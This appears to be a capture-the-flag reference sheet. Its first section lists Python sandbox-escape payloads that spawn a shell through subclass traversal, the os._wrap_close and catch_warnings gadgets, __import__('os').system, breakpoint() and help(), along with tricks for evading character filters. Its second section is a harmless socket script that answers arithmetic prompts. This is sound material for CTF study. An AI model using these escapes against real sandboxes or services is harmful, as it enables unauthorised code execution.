# Misc: PyJail Escapes and Socket Automation

## 1. PyJail Escape Techniques

Common payload patterns to escape restricted Python environments:

### Subclass Traversal
Inspect loaded classes to find execution gadgets such as `subprocess.Popen` or `os._wrap_close`:
```python
# List available subclasses
[c.__name__ for c in ().__class__.__base__.__subclasses__()]

# Execute command using os._wrap_close gadget
[x for x in ().__class__.__base__.__subclasses__() if 'wrap_close' in x.__name__][0].__init__.__globals__['system']('/bin/sh')
```

### Accessing Builtins
```python
# Direct access through builtins dictionary
__builtins__.__dict__['__import__']('os').system('sh')

# Access through warning module globals
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
```

### Interactive Debugger Breakout
```python
breakpoint()    # Drops into pdb; enter: import os; os.system('sh')
help()          # From the help prompt, enter: !sh
```

### Character Filter Evasion
- When periods (`.`) are blocked:
  ```python
  getattr(__import__('os'), 'system')('sh')
  ```
- When quotes are blocked:
  ```python
  chr(115) + chr(104)
  ```
- When `import` or `eval` strings are blocked:
  ```python
  globals()['__builtins__']
  ```

---

## 2. Automated Socket Solver Template

Script template for challenges that require automated answers over a TCP socket:

```python
#!/usr/bin/env python3
import socket
import re

HOST = "challenge.ctf.com"
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

round_count = 1
while True:
    try:
        data = s.recv(4096).decode()
        if not data:
            break
        print(data, end="")

        if "flag{" in data.lower():
            print("\n[+] Flag captured.")
            break

        # Example pattern: "What is 15 + 27?"
        match = re.search(r"What is (\d+)\s*([\+\-\*])\s*(\d+)", data)
        if match:
            num1 = int(match.group(1))
            op = match.group(2)
            num2 = int(match.group(3))

            if op == '+':
                result = num1 + num2
            elif op == '-':
                result = num1 - num2
            elif op == '*':
                result = num1 * num2

            print(f"[*] Submitting: {result}")
            s.sendall(f"{result}\n".encode())
            round_count += 1

    except Exception as err:
        print(f"[-] Connection terminated: {err}")
        break

s.close()
```
